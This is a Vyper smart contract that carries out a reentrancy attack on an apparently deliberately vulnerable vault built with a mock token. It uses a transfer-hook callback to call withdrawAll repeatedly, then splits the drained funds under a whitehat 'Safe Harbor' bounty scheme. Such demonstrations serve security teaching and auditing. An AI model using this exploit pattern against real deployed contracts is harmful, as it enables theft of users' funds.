# pragma version ^0.4.0
"""
@title Attacker
@notice Exploits the CEI violation in VulnerableVault via reentrancy.

@dev ATTACK FLOW
     1. Register this contract as a transfer hook on MockToken
     2. Mint seed tokens and deposit them into VulnerableVault
     3. Call withdrawAll() — vault transfers tokens via token.transfer()
     4. MockToken sees our hook and calls onTokenTransfer()
     5. In onTokenTransfer(), call withdrawAll() again (balance not yet cleared)
     6. Repeat until the vault is empty
     7. Distribute recovered funds per Safe Harbor bounty terms
"""

interface IVulnerableVault:
    def deposit(amount: uint256): nonpayable
    def withdrawAll(): nonpayable

interface IMockToken:
    def mint(to: address, amount: uint256): nonpayable
    def approve(spender: address, amount: uint256) -> bool: nonpayable
    def setTransferHook(hook: address): nonpayable
    def balanceOf(account: address) -> uint256: view
    def transfer(to: address, amount: uint256) -> bool: nonpayable

VAULT:            public(immutable(address))
TOKEN:            public(immutable(address))
RECOVERY_ADDRESS: public(immutable(address))
BOUNTY_BPS:       public(immutable(uint256))
OWNER:            public(immutable(address))


@deploy
def __init__(vault: address, token: address, recovery_address: address, bounty_bps: uint256):
    VAULT            = vault
    TOKEN            = token
    RECOVERY_ADDRESS = recovery_address
    BOUNTY_BPS       = bounty_bps
    OWNER            = msg.sender


@external
def onTokenTransfer(from_: address, amount: uint256):
    """@notice Re-entry hook — called by MockToken when this contract receives tokens."""
    if staticcall IMockToken(TOKEN).balanceOf(VAULT) > 0:
        extcall IVulnerableVault(VAULT).withdrawAll()


@external
def attack(seed_amount: uint256):
    assert msg.sender == OWNER, "only owner"

    # Register ourselves as a transfer hook
    extcall IMockToken(TOKEN).setTransferHook(self)

    # Mint seed tokens and deposit
    extcall IMockToken(TOKEN).mint(self, seed_amount)
    extcall IMockToken(TOKEN).approve(VAULT, seed_amount)
    extcall IVulnerableVault(VAULT).deposit(seed_amount)

    # First withdrawal kicks off the reentrancy chain
    extcall IVulnerableVault(VAULT).withdrawAll()

    # ── Safe Harbor fund distribution ──────────────────────────────────
    total:     uint256 = staticcall IMockToken(TOKEN).balanceOf(self)
    bounty:    uint256 = total * BOUNTY_BPS // 10000
    to_return: uint256 = total - bounty

    extcall IMockToken(TOKEN).transfer(RECOVERY_ADDRESS, to_return)
    extcall IMockToken(TOKEN).transfer(OWNER, bounty)
